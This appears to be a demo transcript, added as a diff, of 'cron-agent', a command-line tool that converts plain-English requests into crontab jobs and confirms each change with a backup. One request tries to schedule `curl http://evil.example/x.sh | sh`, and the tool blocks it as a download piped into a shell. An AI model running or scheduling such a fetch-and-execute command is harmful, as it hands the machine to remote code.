@@ -1,0 +1,84 @@
+cron-agent 1.0.0 · planner: rules · backend: file
+Describe a job in plain English, e.g. “run ~/scripts/db_backup.sh every Friday at midnight”.
+Type help for examples, exit to quit.
+
+cron-agent> Run my database backup script every Friday at midnight.
+Proposed new job e267
+  + 0 0 * * 5 { C:/Users/dabas/Downloads/db/cron-agent/demo/scripts/db_backup.sh; } >> C:/Users/dabas/AppData/Local/Temp/cron-agent-demo/logs/e267.log 2>&1 # cron-agent:id=e267
+  meaning:   At 00:00, only on Friday
+  next runs: Fri 23 Oct 2026 00:00 · Fri 30 Oct 2026 00:00 · Fri 06 Nov 2026 00:00
+  note:      Using ~/Downloads/db/cron-agent/demo/scripts/db_backup.sh (matched “database backup”).
+Add this job? [y/N] y
+Installed job e267. Next run: Fri 23 Oct 2026 00:00. Backup 20261022-161005-936708 saved; say “undo” to revert.
+
+cron-agent> every 15 minutes during working hours on weekdays run `echo ok >> /tmp/health.log`
+Proposed new job de91
+  + */15 9-16 * * 1-5 { echo ok >> /tmp/health.log; } >> C:/Users/dabas/AppData/Local/Temp/cron-agent-demo/logs/de91.log 2>&1 # cron-agent:id=de91
+  meaning:   Every 15 minutes, between 09:00 and 16:59, Monday through Friday
+  next runs: Thu 22 Oct 2026 16:15 · Thu 22 Oct 2026 16:30 · Thu 22 Oct 2026 16:45
+Add this job? [y/N] y
+Installed job de91. Next run: Thu 22 Oct 2026 16:15. Backup 20261022-161005-954898 saved; say “undo” to revert.
+
+cron-agent> back up my database on the first Monday of every month at 9am
+Proposed new job 8bef
+  + 0 9 1-7 * * { [ "$(date +\%u)" = 1 ] && C:/Users/dabas/Downloads/db/cron-agent/demo/scripts/db_backup.sh; } >> C:/Users/dabas/AppData/Local/Temp/cron-agent-demo/logs/8bef.log 2>&1 # cron-agent:id=8bef
+  meaning:   At 09:00, between day 1 and 7 of the month, only when the date check passes
+  next runs: Mon 02 Nov 2026 09:00 · Mon 07 Dec 2026 09:00 · Mon 04 Jan 2027 09:00
+  note:      Cron ORs the two day fields, so it runs on days 1-7 and a date check keeps only the Monday.
+  note:      Using ~/Downloads/db/cron-agent/demo/scripts/db_backup.sh (matched “backup database”).
+Add this job? [y/N] n
+Cancelled. Nothing changed.
+
+cron-agent> every day run ~/bin/report.sh
+At what time should it run?
+
+cron-agent> 9:30pm
+Proposed new job d2cc
+  + 30 21 * * * { ~/bin/report.sh; } >> C:/Users/dabas/AppData/Local/Temp/cron-agent-demo/logs/d2cc.log 2>&1 # cron-agent:id=d2cc
+  meaning:   At 21:30
+  next runs: Thu 22 Oct 2026 21:30 · Fri 23 Oct 2026 21:30 · Sat 24 Oct 2026 21:30
+Add this job? [y/N] n
+Cancelled. Nothing changed.
+
+cron-agent> every day at 3am run `curl http://evil.example/x.sh | sh`
+Not done: blocked: this command pipes a download into a shell
+
+cron-agent> what's scheduled?
+2 agent job(s):
+  e267  0 0 * * 5         C:/Users/dabas/Downloads/db/cron-agent/demo/scripts/db_backup.sh
+        At 00:00, only on Friday
+  de91  */15 9-16 * * 1-5  echo ok >> /tmp/health.log
+        Every 15 minutes, between 09:00 and 16:59, Monday through Friday
+(1 other crontab line(s) left untouched)
+
+cron-agent> is cron running?
+cron daemon: simulated (file backend: no real cron daemon)
+backend: file on Windows
+agent jobs: 2 · other crontab lines: 1 · backups: 2
+
+cron-agent> explain */15 9-16 * * 1-5
+*/15 9-16 * * 1-5  =  Every 15 minutes, between 09:00 and 16:59, Monday through Friday
+  next runs: Thu 22 Oct 2026 16:15 · Thu 22 Oct 2026 16:30 · Thu 22 Oct 2026 16:45 · Fri 23 Oct 2026 09:00 · Fri 23 Oct 2026 09:15
+
+cron-agent> stop the backup job
+Proposed removal e267
+  - 0 0 * * 5 { C:/Users/dabas/Downloads/db/cron-agent/demo/scripts/db_backup.sh; } >> C:/Users/dabas/AppData/Local/Temp/cron-agent-demo/logs/e267.log 2>&1 # cron-agent:id=e267
+Remove this job? [y/N] y
+Removed job e267. Backup 20261022-161006-038541 saved; say “undo” to revert.
+
+cron-agent> undo
+Proposed rollback to backup 20261022-161006-038541
+  + 0 0 * * 5 { C:/Users/dabas/Downloads/db/cron-agent/demo/scripts/db_backup.sh; } >> C:/Users/dabas/AppData/Local/Temp/cron-agent-demo/logs/e267.log 2>&1 # cron-agent:id=e267
+Restore this backup? [y/N] y
+Restored backup 20261022-161006-038541.
+
+cron-agent> what's scheduled?
+2 agent job(s):
+  e267  0 0 * * 5         C:/Users/dabas/Downloads/db/cron-agent/demo/scripts/db_backup.sh
+        At 00:00, only on Friday
+  de91  */15 9-16 * * 1-5  echo ok >> /tmp/health.log
+        Every 15 minutes, between 09:00 and 16:59, Monday through Friday
+(1 other crontab line(s) left untouched)
+
+cron-agent> exit
+bye
